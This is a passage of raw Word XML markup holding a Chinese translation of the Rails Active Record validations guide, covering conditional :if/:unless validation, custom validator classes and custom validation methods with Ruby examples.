          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">你还可一在同一个校验中同时使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来指定条件</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="3DFB3136" w14:textId="77777777" w:rsidTr="006E741A">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="726F954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Computer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DBF69B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:mouse,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7346601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:if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; ["market.retail?", :desktop?]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DE287A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:unless</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; Proc.new</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{ |c| c.trackpad.present? }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="267A542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89BC4A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6E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">校验只用在所有的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定的条件全部评估为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">并且所有 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定的条件没有任何一个评估为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的时候才能执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD4F571"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7 自定义校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D8CCA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当内建的校验 helpers 不能满足你的需求时，你可以根据自己的需求来编写自己的校验器或者校验方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16305CB8"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7.1 自定义校验器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5861B2D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自定义校验器其实就是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">继承了 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>ActiveModel::Validator</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的类。</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">该类中必须实现一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validate</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，它需要接受一个 AR 对象作为参数并对其进行校验。</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">自定义校验器通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validates_with</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来调用</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="77B4427E" w14:textId="77777777" w:rsidTr="00DE4A6D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3716E48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DE4A6D">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="magenta"/>
              </w:rPr>
              <w:t>MyValidator</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> &lt; ActiveModel::Validator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="044AFE7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validate(record)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C11F89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unless</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>record.name.starts_with? 'X'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="687BC53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record.errors[:name] &lt;&lt; 'Need a name starting with X please!'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F4A174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086B535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1868D69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08FD629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BBBAE0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w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A10B38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include ActiveModel::Validations</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DC3886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DE4A6D">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>validates_with</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00DE4A6D">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="magenta"/>
              </w:rPr>
              <w:t>MyValidator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71557D4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5967C80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给需要校验的单独属性</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>添加自定义校验最便捷的方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">是使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>ActiveModel::EachCalidator</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这种情况下，</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">自定义校验类必须实现一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validate_each</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00DE4A6D">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>它接受三个参数：record，attribute 和 value</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，它们分别代表</w:t>
      </w:r>
      <w:r w:rsidRPr="00174405">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>AR对象实例</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00174405">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>被校验的属性</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00174405">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>被校验属性的值</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522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="0F55E9DE" w14:textId="77777777" w:rsidTr="00174405">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D7239F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 xml:space="preserve">EmailValidator &lt; </w:t>
            </w:r>
            <w:r w:rsidRPr="00174405">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>ActiveModel::EachValidator</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2226AF1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174405">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>validate_each</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r w:rsidRPr="00174405">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>record</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00174405">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>attribute</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00174405">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>value</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4118EB7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unless</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value =~ /\A([^@\s]+)@((?:[-a-z0-9]+\.)+[a-z]{2,})\z/i</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="740D03D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record.errors[attribute] &lt;&lt; (options[:message] || "is not an email")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="325985B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2F6B3D8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4025516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72B05D3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2F5ED4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5F9CFAB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:email,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 :email</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244BE9D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DF9B58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如上例所示，你可以将校验 helpers 和自定义校验结合在一起使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB6BC24"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7.2 自定义校验方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405C635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你也可以通过创建自定义校验方法来验证模型的状态，并且当对象校验失败无效后添加相应的信息到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>errors</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象。你必须使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>validate</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类方法，通过 symbols 传入校验方法的方法名来注册自定义校验方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335C6F5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你可以传入多个自定义校验的方法名，他们将按照注册顺于依次执行校验。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="29ACEB5A" w14:textId="77777777" w:rsidTr="005614B9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C27B81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Invoice &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ACF1F2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 :expiration_date_cannot_be_in_the_past,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16EA12B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:discount_cannot_be_greater_than_total_value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CDD25F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3B0637A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expiration_date_cannot_be_in_the_past</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7891704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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>!expiration_date.blank? and</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>expiration_date &lt; Date.today</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E8D74F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errors.add(:expiration_date, "can't be in the past")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13CCF67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3918A2E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012F3A9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0BE65F5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discount_cannot_be_greater_than_total_value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FE4227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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
